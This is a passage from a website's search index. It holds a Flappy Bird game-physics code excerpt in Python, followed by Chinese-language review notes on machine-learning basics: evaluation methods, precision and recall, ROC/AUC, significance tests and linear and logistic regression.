-9  # player's velocity along Y axis\nself.max_vel_y = 10  # max vel along Y, max descend speed\nself.min_vel_y = -8  # min vel along Y, max ascend speed\nself.acc_y = 1  # players downward acceleration\n\nself.rot = 80  # player's current rotation\nself.vel_rot = -3  # player's rotation speed\nself.rot_min = -90  # player's min rotation angle\nself.rot_max = 20  # player's max rotation angle\n\nself.flap_acc = -9  # players speed on flapping\nself.flapped = False  # True when player flaps\n</code></pre> <p>When no input is given, the bird falls due to gravity and rotates downwards:</p> <pre><code>def tick_normal(self) -&gt; None:\n    if self.vel_y &lt; self.max_vel_y and not self.flapped:\n        # when player is not flapping, update velocity (falling)\n        self.vel_y += self.acc_y\n    if self.flapped:\n        # flap only once\n        self.flapped = False\n\n    # change player's y position and rotation\n    self.y = clamp(self.y + self.vel_y, self.min_y, self.max_y)\n    self.rotate()\n</code></pre> <p>When the player taps, the bird flaps its wings and its velocity in the y-axis is updated:</p> <pre><code>def flap(self) -&gt; None:\n    if self.y &gt; self.min_y:\n        self.vel_y = self.flap_acc\n        self.flapped = True\n        self.rot = 80\n        self.config.sounds.wing.play()\n</code></pre> </li> <li> <p>Crash</p> <p>When the bird hits a pipe or the ground, it falls down.</p> <p>The constants for crashing are defined as:</p> <pre><code>self.acc_y = 2\nself.vel_y = 7\nself.max_vel_y = 15\nself.vel_rot = -8\n</code></pre> <p>When hitting a pipe, the bird will also rotate downwards:</p> <pre><code>def tick_crash(self) -&gt; None:\n    if self.min_y &lt;= self.y &lt;= self.max_y:\n        self.y = clamp(self.y + self.vel_y, self.min_y, self.max_y)\n        # rotate only when it's a pipe crash and bird is still falling\n        if self.crash_entity != \"floor\":\n            self.rotate()\n\n    # player velocity change\n    if self.vel_y &lt; self.max_vel_y:\n        self.vel_y += self.acc_y\n</code></pre> </li> </ol>"},{"location":"cs/ml/review/","title":"\u673a\u5668\u5b66\u4e60\u590d\u4e60","text":""},{"location":"cs/ml/review/#_2","title":"\u57fa\u672c\u672f\u8bed\u548c\u6a21\u578b\u8bc4\u4f30","text":""},{"location":"cs/ml/review/#_3","title":"\u672f\u8bed","text":"<ul> <li>\u7279\u5f81\uff1a\u8f93\u5165\u6570\u636e\u7684\u5c5e\u6027</li> <li>\u5c5e\u6027\u503c\uff1a\u7279\u5f81\u7684\u79bb\u6563\u53d6\u503c</li> <li>\u6837\u672c\u7ef4\u5ea6\uff1a\u7279\u5f81\u7684\u6570\u91cf</li> <li>\u5c5e\u6027\u7a7a\u95f4/\u7279\u5f81\u7a7a\u95f4/\u8f93\u5165\u7a7a\u95f4\uff1a\u7279\u5f81\u5f20\u6210\u7684\u7a7a\u95f4</li> <li>\u6807\u8bb0\u7a7a\u95f4/\u8f93\u51fa\u7a7a\u95f4\uff1a\u6807\u8bb0\u5f20\u6210\u7684\u7a7a\u95f4</li> <li>\u793a\u4f8b\uff08instance\uff09/\u6837\u672c\uff08sample\uff09\uff1a\u4e00\u4e2a\u5bf9\u8c61\u7684\u8f93\u5165\uff0c\u4e0d\u542b\u6807\u8bb0</li> <li>\u6837\u4f8b\uff08example\uff09\uff1a\u4e00\u4e2a\u5bf9\u8c61\u7684\u8f93\u5165\u548c\u8f93\u51fa</li> <li>\u8bad\u7ec3\u96c6\uff08training set\uff09\uff1a\u8bad\u7ec3\u6837\u4f8b\u7684\u96c6\u5408</li> <li>\u6d4b\u8bd5\u96c6\uff08test set\uff09\uff1a\u6d4b\u8bd5\u6837\u4f8b\u7684\u96c6\u5408</li> <li>\u4efb\u52a1\uff1a<ol> <li>\u6839\u636e\u6807\u8bb0\u7684\u53d6\u503c\u5212\u5206\uff1a<ul> <li>\u5206\u7c7b\uff08classification\uff09\uff1a\u6807\u8bb0\u7a7a\u95f4\u662f\u6709\u9650\u4e2a\u79bb\u6563\u503c\u7684\u60c5\u51b5</li> <li>\u56de\u5f52\uff08regression\uff09\uff1a\u6807\u8bb0\u7a7a\u95f4\u662f\u8fde\u7eed\u503c\u7684\u60c5\u51b5</li> <li>\u805a\u7c7b\uff08clustering\uff09\uff1a\u65e0\u6807\u8bb0\uff0c\u5c06\u6837\u672c\u5212\u5206\u4e3a\u82e5\u5e72\u7ec4</li> </ul> </li> <li>\u6839\u636e\u6807\u8bb0\u7684\u5b8c\u6574\u6027\u5212\u5206\uff1a<ul> <li>\u76d1\u7763\u5b66\u4e60\uff08supervised learning\uff09\uff1a\u8bad\u7ec3\u96c6\u6709\u6807\u8bb0</li> <li>\u65e0\u76d1\u7763\u5b66\u4e60\uff08unsupervised learning\uff09\uff1a\u8bad\u7ec3\u96c6\u65e0\u6807\u8bb0</li> <li>\u534a\u76d1\u7763\u5b66\u4e60\uff08semi-supervised learning\uff09\uff1a\u8bad\u7ec3\u96c6\u6709\u90e8\u5206\u6807\u8bb0</li> <li>\u566a\u58f0\u6807\u8bb0\uff08noise label\uff09\uff1a\u8bad\u7ec3\u96c6\u4e2d\u7684\u6807\u8bb0\u53ef\u80fd\u6709\u8bef</li> </ul> </li> </ol> </li> <li>\u76ee\u6807\uff1a\u6cdb\u5316\u80fd\u529b</li> </ul>"},{"location":"cs/ml/review/#_4","title":"\u6982\u5ff5\u5b66\u4e60","text":"<p>\u6700\u7406\u60f3\u7684\u673a\u5668\u5b66\u4e60\u6280\u672f\u662f\u5b66\u4e60\u5230\u6982\u5ff5\u3002</p> <ul> <li>\u5047\u8bbe\u7a7a\u95f4\uff1a\u8bbe\u7b2c \\(i\\) \u4e2a\u5c5e\u6027\u7684\u53d6\u503c\u6709 \\(n_i\\) \u79cd\uff0c\u5219\u5047\u8bbe\u7a7a\u95f4\u5927\u5c0f\u4e3a \\(1 + \\prod_{i=1}^{d} (n_i + 1)\\)\u3002\u83b7\u5f97\u4e0e\u8bad\u7ec3\u96c6\u4e00\u81f4\uff08\u5373\u5bf9\u6240\u6709\u8bad\u7ec3\u6837\u672c \u80fd\u591f\u8fdb\u884c\u6b63\u786e\u5224\u65ad\uff09\u7684\u5047\u8bbe</li> <li>\u7248\u672c\u7a7a\u95f4\uff1a\u4e0e\u8bad\u7ec3\u96c6\u4e00\u81f4\u7684\u5047\u8bbe\u96c6\u5408\u3002</li> <li>\u5f52\u7eb3\u504f\u597d\uff1a\u9762\u4e34\u65b0\u6837\u672c\u65f6\uff0c\u4e0d\u540c\u5047\u8bbe\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u8f93\u51fa\u3002\u7b97\u6cd5\u5bf9\u67d0\u4e9b\u5047\u8bbe\u7684\u504f\u597d\u79f0\u4e3a\u5f52\u7eb3\u504f\u597d\u3002</li> <li>No Free Lunch Theorem\uff1a\u6ca1\u6709\u4e00\u4e2a\u7b97\u6cd5\u80fd\u591f\u5728\u6240\u6709\u95ee\u9898\u4e0a\u8868\u73b0\u6700\u597d\u3002</li> </ul>"},{"location":"cs/ml/review/#_5","title":"\u6a21\u578b\u8bc4\u4f30\u4e0e\u9009\u62e9","text":"<ul> <li>\u9519\u8bef\u7387\uff1a\u5206\u7c7b\u9519\u8bef\u7684\u6837\u672c\u6570\u5360\u603b\u6837\u672c\u6570\u7684\u6bd4\u4f8b</li> <li>\u8bef\u5dee\uff1a\u6837\u672c\u771f\u5b9e\u8f93\u51fa\u4e0e\u6a21\u578b\u8f93\u51fa\u4e4b\u95f4\u7684\u5dee\u5f02</li> <li> <p>\u8fc7\u62df\u5408\uff1a\u5c06\u8bad\u7ec3\u6837\u672c\u7684\u7279\u70b9\u5f53\u4f5c\u6240\u6709\u6837\u672c\u7684\u4e00\u822c\u6027\u8d28\uff0c\u6cdb\u5316\u6027\u80fd\u5dee\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u4f18\u5316\u76ee\u6807\u51fd\u6570\u52a0\u5165\u6b63\u5219\u9879\uff0cearly stop</p> </li> <li> <p>\u6b20\u62df\u5408\uff1a\u6a21\u578b\u8fc7\u4e8e\u7b80\u5355\uff0c\u5bf9\u4e00\u822c\u6027\u8d28\u7684\u5b66\u4e60\u4e0d\u8db3\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u6269\u5c55\u5206\u652f\uff08\u51b3\u7b56\u6811\uff09\uff0c\u589e\u52a0\u5c42\u6570\u3001\u8bad\u7ec3\u8f6e\u6570\uff08\u795e\u7ecf\u7f51\u7edc\uff09</p> </li> </ul> <p>\u8bc4\u4f30\u65b9\u6cd5\uff1a</p> <ul> <li>\u7559\u51fa\u6cd5\uff08hold-out\uff09\uff1a\u5c06\u6570\u636e\u96c6\u5212\u5206\u4e3a\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\u3002\u5c3d\u53ef\u80fd\u4fdd\u8bc1\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\u7684\u5206\u5e03\u4e00\u81f4\uff08\u5206\u5c42\u91c7\u6837\uff09\uff0c\u91cd\u590d\u591a\u6b21\u53d6\u5e73\u5747\u503c\u3002</li> <li> <p>\u4ea4\u53c9\u9a8c\u8bc1\u6cd5\uff08cross validation\uff09\uff1a\u5c06\u6570\u636e\u96c6\u5206\u5c42\u91c7\u6837\u5212\u5206\u4e3a \\(k\\) \u4e2a\u5b50\u96c6\uff0c\u6bcf\u6b21\u7528 \\(k-1\\) \u4e2a\u5b50\u96c6\u8bad\u7ec3\uff0c\u5269\u4e0b\u7684\u5b50\u96c6\u6d4b\u8bd5\uff0c\u91cd\u590d \\(k\\) \u6b21\u53d6\u5e73\u5747\u503c\u3002</p> <p>\\(k\\) \u6700\u5e38\u7528\u7684\u53d6\u503c\u662f 10\uff0c\u79f0\u4e3a 10 \u6298\u4ea4\u53c9\u9a8c\u8bc1\u3002\u968f\u673a\u4f7f\u7528\u4e0d\u540c\u7684\u5212\u5206\u91cd\u590d \\(p\\) \u6b21\u53d6\u5e73\u5747\u503c\uff0c\u79f0\u4e3a \\(p\\) \u6b21 \\(k\\) \u6298\u4ea4\u53c9\u9a8c\u8bc1\u3002</p> </li> <li> <p>\u7559\u4e00\u6cd5\uff08LOO\uff09\uff1a\u4ee4\u4ea4\u53c9\u9a8c\u8bc1\u6cd5\u4e2d \\(k\\) \u7b49\u4e8e\u6837\u672c\u6570\uff0c\u5219\u4e3a\u7559\u4e00\u6cd5\u3002</p> <p>\u4f18\u70b9\uff1a\u4e0d\u53d7\u968f\u673a\u6837\u672c\u5212\u5206\u65b9\u5f0f\u5f71\u54cd\uff0c\u7ed3\u679c\u5f80\u5f80\u6bd4\u8f83\u51c6\u786e\u3002</p> <p>\u7f3a\u70b9\uff1a\u8ba1\u7b97\u5f00\u9500\u5927\u3002</p> </li> <li> <p>\u81ea\u52a9\u6cd5\uff08bootstrap\uff09\uff1a\u5bf9\u4e8e\u5927\u5c0f\u4e3a \\(N\\) \u7684\u6570\u636e\u96c6\uff0c\u6bcf\u6b21\u4ece\u4e2d\u968f\u673a\u91c7\u6837\u4e00\u4e2a\u6837\u672c\uff0c\u653e\u56de\uff0c\u91cd\u590d \\(N\\) \u6b21\uff0c\u5f97\u5230\u5927\u5c0f\u4e3a \\(N\\) \u7684\u8bad\u7ec3\u96c6\u3002\u5269\u4e0b\u7684\u6837\u672c\u4f5c\u4e3a\u6d4b\u8bd5\u96c6\u3002\u4e00\u822c\u7528\u4e8e\u6570\u636e\u96c6\u8f83\u5c0f\u7684\u60c5\u51b5\u3002</p> </li> <li>\u53c2\u6570\u8c03\u4f18</li> </ul>"},{"location":"cs/ml/review/#_6","title":"\u6027\u80fd\u5ea6\u91cf","text":"<p>\u8861\u91cf\u6a21\u578b\u6cdb\u5316\u80fd\u529b\u7684\u6307\u6807\u3002</p> <ul> <li> <p>\u5747\u65b9\u8bef\u5dee\uff08mean squared error\uff09\uff1a</p> \\[ E(f;D) = \\frac{1}{N} \\sum_{i=1}^{N} (f(x_i) - y_i)^2 \\] <p>\u5bf9\u4e8e\u6570\u636e\u5206\u5e03 \\(\\mathcal{D}\\) \u548c\u6982\u7387\u5bc6\u5ea6\u51fd\u6570 \\(p(\\cdot)\\)\uff0c\u5747\u65b9\u8bef\u5dee\u4e3a\uff1a</p> \\[ E(f;\\mathcal{D}) = \\int_{x \\sim \\mathcal{D}} (f(x) - y)^2 p(x) \\ \\mathrm{d}x \\] </li> <li> <p>\u9519\u8bef\u7387\uff08error rate\uff09\uff1a</p> <p>\u5206\u7c7b\u9519\u8bef\u7387\uff1a</p> \\[ E(f;D) = \\frac{1}{m} \\sum_{i=1}^{m} \\mathbb{I}(f(x_i) \\neq y_i) \\] </li> <li> <p>\u7cbe\u5ea6\uff08accuracy\uff09\uff1a</p> \\[ \\mathrm{acc}(f;D) = \\frac{1}{m} \\sum_{i=1}^{m} \\mathbb{I}(f(x_i) = y_i) = 1 - E(f;D) \\] </li> </ul>"},{"location":"cs/ml/review/#_7","title":"\u6df7\u6dc6\u77e9\u9635","text":"<p>\u5217\u4e3a\u9884\u6d4b\u7ed3\u679c\uff0c\u884c\u4e3a\u771f\u5b9e\u7ed3\u679c\uff1a</p> \u9884\u6d4b\u6b63\u4f8b \u9884\u6d4b\u53cd\u4f8b \u771f\u5b9e\u6b63\u4f8b TP FN \u771f\u5b9e\u53cd\u4f8b FP TN <ul> <li> <p>\u67e5\u51c6\u7387\uff08precision\uff09\uff1a</p> \\[ P = \\frac{TP}{TP + FP} \\] </li> <li> <p>\u67e5\u5168\u7387\uff08recall\uff09\uff1a</p> \\[ R = \\frac{TP}{TP + FN} \\] </li> <li> <p>P-R \u66f2\u7ebf\uff1a\u6a2a\u8f74\u4e3a\u67e5\u5168\u7387\uff08R\uff09\uff0c\u7eb5\u8f74\u4e3a\u67e5\u51c6\u7387\uff08P\uff09\u3002\u82e5\u4e00\u4e2a\u5b66\u4e60\u5668\u7684 P-R \u66f2\u7ebf\u88ab\u53e6\u4e00\u4e2a\u5b66\u4e60\u5668\u7684\u66f2\u7ebf\u5b8c\u5168\"\u5305\u4f4f\"\uff0c\u5219\u53ef\u65ad\u8a00\u540e\u8005\u7684\u6027\u80fd\u4f18\u4e8e\u524d\u8005\u3002</p> </li> <li>\u5e73\u8861\u70b9\uff08break-even point BEP\uff09\uff1aP-R \u66f2\u7ebf\u4e0a\u67e5\u51c6\u7387\u7b49\u4e8e\u67e5\u5168\u7387\u7684\u70b9\u3002\u53ef\u4ee5\u57fa\u4e8e\u5e73\u8861\u70b9\u6765\u6bd4\u8f83\u4e0d\u540c\u5b66\u4e60\u5668\u7684\u6027\u80fd\u3002</li> <li> <p>F1 \u5ea6\u91cf\uff1a</p> \\[ F1 = \\frac{2 \\times P \\times R}{P + R} \\] <p>\u5b9e\u9645\u4e0a\u662f\u8c03\u548c\u5e73\u5747\u6570\uff1a</p> \\[ \\frac{1}{F1} = \\frac{1}{2} \\left( \\frac{1}{P} + \\frac{1}{R} \\right) \\] </li> <li> <p>\\(F_\\beta\\) \u5ea6\u91cf\uff1a</p> \\[ F_\\beta = \\frac{(1 + \\beta^2) \\times P \\times R}{\\beta^2 \\times P + R} \\] <p>\u5f53 \\(\\beta = 1\\) \u65f6\uff0c\\(F_\\beta\\) \u9000\u5316\u4e3a \\(F1\\)\u3002\u5b9e\u9645\u4e0a\u662f \\(P\\) \u548c \\(R\\) \u7684\u52a0\u6743\u8c03\u548c\u5e73\u5747\u6570\uff1a</p> \\[ \\frac{1}{F_\\beta} = \\frac{1}{1 + \\beta^2} \\left( \\frac{1}{P} + \\frac{\\beta^2}{R} \\right) \\] </li> </ul> <p>\u591a\u4e2a\u6df7\u6dc6\u77e9\u9635\uff1a</p> <p>\u5148\u5206\u522b\u8ba1\u7b97\u67e5\u51c6\u7387\u548c\u67e5\u5168\u7387\uff1a</p> <ul> <li> <p>\u5b8f\u67e5\u51c6\u7387\uff08macro-precision\uff09\uff1a</p> \\[ \\text{macro-}P = \\frac{1}{n} \\sum_{i=1}^{n} P_i \\] </li> <li> <p>\u5b8f\u67e5\u5168\u7387\uff08macro-recall\uff09\uff1a</p> \\[ \\text{macro-}R = \\frac{1}{n} \\sum_{i=1}^{n} R_i \\] </li> <li> <p>\u5b8f \\(F1\\) \u5ea6\u91cf\uff1a</p> \\[ \\text{macro-}F1 = \\frac{2 \\times \\text{macro-}P \\times \\text{macro-}R}{\\text{macro-}P + \\text{macro-}R} \\] </li> </ul> <p>\u8ba1\u7b97\u6df7\u6dc6\u77e9\u9635\u7684\u5e73\u5747\u503c\uff0c\u518d\u8ba1\u7b97\u67e5\u51c6\u7387\u548c\u67e5\u5168\u7387\uff1a</p> <ul> <li> <p>\u5fae\u67e5\u51c6\u7387\uff08micro-precision\uff09\uff1a</p> \\[ \\text{micro-}P = \\frac{\\overline{TP}}{\\overline{TP} + \\overline{FP}} \\] </li> <li> <p>\u5fae\u67e5\u5168\u7387\uff08micro-recall\uff09\uff1a</p> \\[ \\text{micro-}R = \\frac{\\overline{TP}}{\\overline{TP} + \\overline{FN}} \\] </li> <li> <p>\u5fae \\(F1\\) \u5ea6\u91cf\uff1a</p> \\[ \\text{micro-}F1 = \\frac{2 \\times \\text{micro-}P \\times \\text{micro-}R}{\\text{micro-}P + \\text{micro-}R} \\] </li> </ul>"},{"location":"cs/ml/review/#roc-auc","title":"ROC \u4e0e AUC","text":"<p>\u6839\u636e\u5b66\u4e60\u5668\u8f93\u51fa\u7684\u5b9e\u6570\u503c\u5bf9\u6837\u4f8b\u8fdb\u884c\u6392\u5e8f\uff0c\u6309\u6b64\u987a\u5e8f\u9010\u4e2a\u628a\u6837\u672c\u4f5c\u4e3a\u6b63\u4f8b\u8fdb\u884c\u9884\u6d4b\uff0c\u6bcf\u6b21\u8ba1\u7b97\u51fa\u5047\u6b63\u4f8b\u7387\uff08FPR\uff09\u548c\u771f\u6b63\u4f8b\u7387\uff08TPR\uff09\uff1a</p> <ul> <li> <p>\u771f\u6b63\u4f8b\u7387\uff08TPR\uff09\uff1a</p> \\[ TPR = \\frac{TP}{TP + FN} \\] </li> <li> <p>\u5047\u6b63\u4f8b\u7387\uff08FPR\uff09\uff1a</p> \\[ FPR = \\frac{FP}{FP + TN} \\] </li> </ul> <p>\u4ee5 FPR \u4e3a\u6a2a\u8f74\uff0cTPR \u4e3a\u7eb5\u8f74\u4f5c\u56fe\uff0c\u5f97\u5230 ROC \u66f2\u7ebf\u3002</p> <p>\u82e5\u4e00\u4e2a\u5b66\u4e60\u5668\u7684 ROC \u66f2\u7ebf\u88ab\u53e6\u4e00\u4e2a\u5b66\u4e60\u5668\u7684\u66f2\u7ebf\u5b8c\u5168\"\u5305\u4f4f\"\uff0c\u5219\u53ef\u65ad\u8a00\u540e\u8005\u7684\u6027\u80fd\u4f18\u4e8e\u524d\u8005\u3002\u82e5\u4e24\u4e2a\u5b66\u4e60\u5668\u7684 ROC \u66f2\u7ebf\u53d1\u751f\u4ea4\u53c9\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83 ROC \u66f2\u7ebf\u4e0b\u7684\u9762\u79ef\uff08AUC\uff09\u6765\u5224\u65ad\u6027\u80fd\uff1a</p> \\[     \\text{AUC} = \\frac{1}{2} \\sum_{i=1}^{m-1} (x_{i+1} - x_i) (y_i + y_{i+1}) \\] <p>AUC \u8003\u8651\u7684\u662f\u6837\u672c\u9884\u6d4b\u7684\u6392\u5e8f\u8d28\u91cf\u3002</p>"},{"location":"cs/ml/review/#_8","title":"\u4ee3\u4ef7\u654f\u611f\u9519\u8bef\u7387","text":"<p>\u6743\u8861\u4e0d\u540c\u7c7b\u578b\u9519\u8bef\u6240\u9020\u6210\u7684\u4e0d\u540c\u635f\u5931\uff0c\u53ef\u4e3a\u9519\u8bef\u8d4b\u4e88\u201c\u975e\u5747\u7b49\u4ee3\u4ef7\u201d\uff08unequal cost\uff09\u3002</p> <p>\u771f\u5b9e\u7c7b\u522b\u4e3a \\(i\\)\uff0c\u9884\u6d4b\u7c7b\u522b\u4e3a \\(j\\) \u7684\u4ee3\u4ef7\u4e3a \\(cost_{ij}\\)\uff0c\u5219\u4ee3\u4ef7\u654f\u611f\u9519\u8bef\u7387\u4e3a\uff1a</p> \\[ E(f;D) = \\frac{1}{m} \\sum_{i=1}^{m} (\\sum_{x_i \\in D^+} \\mathbb{I}(f(x_i) \\neq y_i) \\times cost_{01} + \\sum_{x_i \\in D^-} \\mathbb{I}(f(x_i) \\neq y_i) \\times cost_{10}) \\]"},{"location":"cs/ml/review/#_9","title":"\u4e8c\u9879\u68c0\u9a8c","text":"<p>\u8bbe\u6cdb\u5316\u9519\u8bef\u7387\u4e3a \\(\\epsilon\\)\uff0c\u6d4b\u8bd5\u9519\u8bef\u7387\u4e3a \\(\\hat{\\epsilon}\\)\uff0c\u4f7f\u7528\u4e8c\u9879\u68c0\u9a8c\u68c0\u6d4b \\(\\epsilon \\leq \\epsilon_0\\) \u7684\u663e\u8457\u6027\u3002</p> <p>\u82e5\u6d4b\u8bd5\u9519\u8bef\u7387\u5c0f\u4e8e</p> \\[ \\bar\\epsilon = \\max \\epsilon \\ \\text{s.t.} \\ \\sum_{i=\\epsilon_0 m + 1}^m \\binom{m}{i} \\epsilon^i (1 - \\epsilon)^{m-i} &lt; \\alpha \\] <p>\u5219\u5728 \\(\\alpha\\) \u7684\u663e\u8457\u5ea6\u4e0b\uff0c\u5047\u8bbe\u4e0d\u80fd\u88ab\u62d2\u7edd\u3002\u5373\u80fd\u4ee5\u7f6e\u4fe1\u5ea6 \\(1 - \\alpha\\) \u8ba4\u4e3a\u6cdb\u5316\u9519\u8bef\u7387\u4e0d\u5927\u4e8e \\(\\epsilon_0\\)\u3002</p>"},{"location":"cs/ml/review/#t","title":"T \u68c0\u9a8c","text":"<p>\u591a\u6b21\u91cd\u590d\u7559\u51fa\u6cd5\u6216\u4ea4\u53c9\u9a8c\u8bc1\u6cd5\u7b49\u8fdb\u884c\u591a\u6b21\u8bad\u7ec3/\u6d4b\u8bd5\uff0c\u4f1a\u5f97\u5230 \\(k\\) \u4e2a\u6d4b\u8bd5\u9519\u8bef\u7387 \\(\\hat{\\epsilon}_1, \\hat{\\epsilon}_2, \\cdots, \\hat{\\epsilon}_k\\)\uff0c\u8ba1\u7b97\u5e73\u5747\u9519\u8bef\u7387 \\(\\mu\\) \u548c\u6837\u672c\u65b9\u5dee \\(\\sigma^2\\)\uff1a</p> \\[ \\begin{aligned} \\mu &amp;= \\frac{1}{k} \\sum_{i=1}^{k} \\hat{\\epsilon}_i \\\\ \\sigma^2 &amp;= \\frac{1}{k-1} \\sum_{i=1}^{k} (\\hat{\\epsilon}_i - \\mu)^2 \\end{aligned} \\] <p>\u53d8\u91cf</p> \\[ \\tau_t = \\frac{\\sqrt{k}(\\mu - \\epsilon_0)}{\\sigma} \\] <p>\u670d\u4ece\u81ea\u7531\u5ea6\u4e3a \\(k-1\\) \u7684 t \u5206\u5e03\u3002\u8003\u8651\u53cc\u8fb9\u5047\u8bbe\uff0c\u82e5 \\(|\\mu - \\epsilon_0| \\in [t_{-\\alpha/2}, t_{\\alpha/2}]\\) \u5219\u5728\u7f6e\u4fe1\u5ea6 \\(1 - \\alpha\\) \u4e0b\uff0c\u5047\u8bbe\u4e0d\u80fd\u88ab\u62d2\u7edd\u3002</p>"},{"location":"cs/ml/review/#t_1","title":"\u4ea4\u53c9\u9a8c\u8bc1 T \u68c0\u9a8c","text":"<p>\u5bf9\u4e24\u4e2a\u5b66\u4e60\u5668 A \u548c B \uff0c\u82e5\u4f7f\u7528 k \u6298\u4ea4\u53c9\u9a8c\u8bc1\u6cd5\u5f97\u5230\u7684\u6d4b\u8bd5\u9519\u8bef\u7387\u5206\u522b\u4e3a \\(\\hat{\\epsilon}_1^A, \\hat{\\epsilon}_2^A, \\cdots, \\hat{\\epsilon}_k^A\\) \u548c \\(\\hat{\\epsilon}_1^B, \\hat{\\epsilon}_2^B, \\cdots, \\hat{\\epsilon}_k^B\\)\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u6210\u5bf9 T \u68c0\u9a8c\u68c0\u9a8c\u4e24\u4e2a\u5b66\u4e60\u5668\u7684\u6027\u80fd\u662f\u5426\u6709\u663e\u8457\u5dee\u5f02\u3002</p> <p>\u57fa\u672c\u601d\u8def\u662f\u8ba1\u7b97\u51fa \\(\\Delta_i = \\hat{\\epsilon}_i^A - \\hat{\\epsilon}_i^B\\)\uff0c\u8ba1\u7b97\u5e73\u5747\u5dee\u503c \\(\\mu_\\Delta\\) \u548c\u6837\u672c\u65b9\u5dee \\(\\sigma_\\Delta^2\\)\uff1a</p>"},{"location":"cs/ml/review/#_10","title":"\u7ebf\u6027\u6a21\u578b","text":"<p>\u4e00\u822c\u5f62\u5f0f\uff1a</p> \\[ f(\\mathbf{x}) = \\omega_1 x_1 + \\omega_2 x_2 + \\cdots + \\omega_d x_d + b \\] <p>\u4f18\u70b9\uff1a\u5f62\u5f0f\u7b80\u5355\u3001\u6613\u4e8e\u5efa\u6a21\uff1b\u53ef\u89e3\u91ca\u6027\u5f3a\u3002</p>"},{"location":"cs/ml/review/#perceptron","title":"Perceptron \u611f\u77e5\u673a","text":"<p>\u7ebf\u6027\u6a21\u578b\u4e2d\uff0c\u82e5\u8bef\u5206\u7c7b\uff0c\u5219\u6709\uff1a</p> \\[ -y_i(\\omega^T x_i + b) &gt; 0 \\] <p>\u5b9a\u4e49\u635f\u5931\u51fd\u6570</p> \\[ L(\\omega, b) = -\\sum_{x_i \\in M} y_i(\\omega^T x_i + b) \\] <p>\u68af\u5ea6\uff1a</p> \\[ \\begin{aligned} \\frac{\\partial L}{\\partial \\omega} &amp;= -\\sum_{x_i \\in M} y_i x_i \\\\ \\frac{\\partial L}{\\partial b} &amp;= -\\sum_{x_i \\in M} y_i \\end{aligned} \\]"},{"location":"cs/ml/review/#_11","title":"\u7ebf\u6027\u56de\u5f52","text":"<p>\u76ee\u6807\uff1a</p> \\[ f(x) = \\omega^T x + b, \\ \\text{s.t.} \\ f(x_i) \\approx y_i \\] <p>\u6700\u5c0f\u4e8c\u4e58\u6cd5\uff1a</p> \\[ \\begin{aligned} (\\omega^*, b^*) &amp;= \\arg\\min_{\\omega, b} \\sum_{i=1}^{m} (f(x_i) - y_i)^2 \\\\ &amp;= \\arg\\min_{\\omega, b} \\sum_{i=1}^{m} (y_i - \\omega x_i - b)^2 \\end{aligned} \\] <p>\u89e3\u6790\u89e3\uff1a</p> \\[ \\begin{aligned} \\omega^* &amp;= \\frac{\\sum_{i=1}^{m} y_i (x_i - \\bar{x})}{\\sum_{i=1}^{m} x_i^2 - \\frac{1}{m} (\\sum_{i=1}^{m} x_i)^2} \\\\ b^* &amp;= \\frac{1}{m} \\sum_{i=1}^{m} (y_i - \\omega^* x_i) \\end{aligned} \\]"},{"location":"cs/ml/review/#_12","title":"\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b","text":"<p>\u4e00\u822c\u5f62\u5f0f\uff1a</p> \\[ y = g^{-1}(\\omega^T x + b) \\] <p>\u5176\u4e2d \\(g(\\cdot)\\) \u4e3a\u8fde\u63a5\u51fd\u6570\uff08link function\uff09\u3002</p>"},{"location":"cs/ml/review/#_13","title":"\u5bf9\u6570\u51e0\u7387\u56de\u5f52","text":"<p>\u4e8c\u5206\u7c7b\u4efb\u52a1\u4e2d\uff0c\u8f93\u51fa\u6807\u8bb0 \\(y \\in \\{0, 1\\}\\)\uff0c\u9700\u8981\u5c06\u7ebf\u6027\u56de\u5f52\u7684\u5b9e\u503c\u8f93\u51fa \\(z\\) \u8f6c\u6362\u4e3a 0-1 \u8f93\u51fa\u3002</p> <ul> <li> <p>\u5355\u4f4d\u9636\u8dc3\u51fd\u6570\uff08step function\uff09\uff1a</p> \\[ y = \\begin{cases} 1, &amp; z &gt; 0 \\\\ 0.5, &amp; z = 0 \\\\ 0, &amp; z &lt; 0 \\end{cases} \\] <p>\u5f53 \\(z = 0\\) \u65f6\uff0c\u53ef\u4ee5\u4efb\u610f\u5224\u522b\u4e3a 0 \u6216 1\u3002</p> </li> <li> <p>\u5bf9\u6570\u51e0\u7387\u51fd\u6570\uff08logistic function\uff09\uff1a</p> <p>\u5355\u4f4d\u9636\u8dc3\u51fd\u6570\u4e0d\u8fde\u7eed\uff0c\u4e0d\u80fd\u7528\u4f5c \\(g(\\cdot)\\)\u3002\u5bf9\u6570\u51e0\u7387\u51fd\u6570\u4e3a\u5355\u4f4d\u9636\u8dc3\u51fd\u6570\u7684\u8fde\u7eed\u8fd1\u4f3c\uff1a</p> \\[ y = \\frac{1}{1 + e^{-z}} \\] </li> </ul> <p>\u628a\u5bf9\u6570\u51e0\u7387\u51fd\u6570\u4ee3\u5165\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\uff0c\u5f97\u5230\u5bf9\u6570\u51e0\u7387\u56de\u5f52\u6a21\u578b\uff1a</p> \\[ y = \\frac{1}{1 + e^{-(\\omega^T x + b)}} \\] <p>\u53d8\u6362\u4e3a\uff1a</p> \\[ \\ln \\frac{y}{1-y} = \\omega^T x + b \\] <p>\u5c06 \\(y\\) \u4f5c\u4e3a\u6b63\u4f8b\u7684\u6982\u7387\uff0c\\(1-y\\) \u4f5c\u4e3a\u53cd\u4f8b\u7684\u6982\u7387\uff0c\u4e24\u8005\u6bd4\u503c \\(y/(1-y)\\) \u79f0\u4e3a\u51e0\u7387\uff08odds\uff09\uff0c\u53cd\u6620\u4e86\u6b63\u4f8b\u76f8\u5bf9\u4e8e\u53cd\u4f8b\u7684\u53ef\u80fd\u6027\u3002</p> <p>\u53d6\u5bf9\u6570\u5219\u4e3a\u5bf9\u6570\u51e0\u7387\uff08log odds\uff09 \\(\\ln 